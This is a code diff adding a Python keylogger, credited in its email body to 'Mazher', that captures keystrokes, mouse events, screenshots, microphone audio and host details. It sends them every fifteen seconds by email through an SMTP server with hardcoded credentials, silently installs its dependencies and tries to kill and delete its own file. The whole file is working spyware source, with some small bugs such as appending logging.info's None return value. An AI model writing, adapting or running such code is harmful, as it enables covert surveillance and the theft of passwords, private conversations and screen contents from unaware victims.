@@ -1,0 +1,190 @@
+import logging, os, platform, smtplib, socket, threading, wave
+import sounddevice as sd
+from PIL import ImageGrab
+from pynput import keyboard
+from pynput.keyboard import Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+# Check if 'pyscreenshot' module is available; if not, try to install it
+try:
+    import pyscreenshot
+except ModuleNotFoundError:
+    from subprocess import call
+    modules = ["pyscreenshot", "sounddevice", "pynput"]
+    call("pip install " + ' '.join(modules), shell=True)
+
+finally:
+    # Email configuration
+    EMAIL_ADDRESS = "feabf519f73f54"
+    EMAIL_PASSWORD = "1ec2c6109e31f4"
+    SEND_REPORT_EVERY = 15  # as in seconds
+
+# Define a KeyLogger class to handle keylogging and reporting
+class KeyLogger:
+    def __init__(self, time_interval, email, password):
+        self.interval = time_interval
+        self.log = "KeyLogger Started..."
+        self.email = email
+        self.password = password
+
+    # Append a log string
+    def appendlog(self, string):
+        self.log = self.log + string
+
+    # Handle mouse movement
+    def on_move(self, x, y):
+        current_move = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_move)
+
+    # Handle mouse click
+    def on_click(self, x, y):
+        current_click = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_click)
+
+    # Handle mouse scroll
+    def on_scroll(self, x, y):
+        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_scroll)
+
+    # Handle key presses and append to log
+    def save_data(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = "SPACE"
+            elif key == key.esc:
+                current_key = "ESC"
+            else:
+                current_key = " " + str(key) + " "
+
+        self.appendlog(current_key)
+
+    # Send an email with the specified message and optional file attachment
+    def send_mail(self, email, password, message, file=None):
+        try:
+            sender = "Private Person <from@example.com>"
+            receiver = "A Test User <to@example.com>"
+
+            # Create a MIME object for the email
+            msg = MIMEMultipart()
+            msg["Subject"] = "main Mailtrap"
+            msg["To"] = receiver
+            msg["From"] = sender
+
+            # Attach the message
+            msg.attach(MIMEText("Keylogger by Mazher\n"))
+
+            if file:
+                # Attach the file
+                attachment = open(file, "rb")
+                attachment_mime = MIMEBase("application", "octet-stream")
+                attachment_mime.set_payload(attachment.read())
+                encoders.encode_base64(attachment_mime)
+                attachment_mime.add_header("Content-Disposition", f"attachment; filename={file}")
+                msg.attach(attachment_mime)
+
+            # Connect to the SMTP server and send the email
+            print("Connecting to SMTP server...")
+            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+                print("Connected. Logging in...")
+                server.login(email, password)
+                print("Logged in. Sending email...")
+                server.sendmail(sender, receiver, msg.as_string())
+                print("Email sent successfully.")
+
+        except Exception as e:
+            print(f"Error sending email: {e}")
+
+    # Collect and save system information
+    def system_information(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+
+        # Create a text file to store system information
+        system_info_file = "system_info.txt"
+        with open(system_info_file, "w") as file:
+            file.write(f"Hostname: {hostname}\n")
+            file.write(f"IP Address: {ip}\n")
+            file.write(f"Processor: {plat}\n")
+            file.write(f"System Type: {system}\n")
+            file.write(f"Machine Type: {machine}\n")
+
+        # Return the path to the system information file
+        return system_info_file
+
+    # Periodically send a report via email
+    def report(self):
+        # Get the path to the system information file
+        system_info_file = self.system_information()
+
+        # Include system information in the email report
+        self.screenshot()  # Take a screenshot before sending the report
+        self.microphone()  # Record audio before sending the report
+        self.send_mail(self.email, self.password, "\n\n" + self.log, file="screenshot.png")
+        self.send_mail(self.email, self.password, "Audio Recording Attached", file="sound.wav")
+        self.send_mail(self.email, self.password, "System Information Attached", file=system_info_file)
+
+        # Delete the system information file after sending
+        os.remove(system_info_file)
+
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    # Record audio using the microphone
+    def microphone(self):
+        fs = 44100
+        seconds = SEND_REPORT_EVERY
+        obj = wave.open('sound.wav', 'w')
+        obj.setnchannels(1)  # mono
+        obj.setsampwidth(2)
+        obj.setframerate(fs)
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
+        sd.wait()
+        obj.writeframesraw(myrecording)
+        obj.close()
+
+    # Take a screenshot and save it as an image file
+    def screenshot(self):
+        img = ImageGrab.grab()  # Use Pillow's ImageGrab to take a screenshot
+        img.save("screenshot.png")  # Save the screenshot as an image file
+
+    # Run the keylogger
+    def run(self):
+        keyboard_listener = keyboard.Listener(on_press=self.save_data)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+            mouse_listener.join()
+        if os.name == "nt":
+            try:
+                pwd = os.path.abspath(os.getcwd())
+                os.system("cd " + pwd)
+                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+                print('File was closed.')
+                os.system("DEL " + os.path.basename(__file__))
+            except OSError:
+                print('File is close.')
+
+        else:
+            try:
+                pwd = os.path.abspath(os.getcwd())
+                os.system("cd " + pwd)
+                os.system('pkill leafpad')
+                os.system("chattr -i " + os.path.basename(__file__))
+                print('File was closed.')
+                os.system("rm -rf" + os.path.basename(__file__))
+            except OSError:
+                print('File is close.')
+
+# Create an instance of the KeyLogger and start it
+keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+keylogger.run()
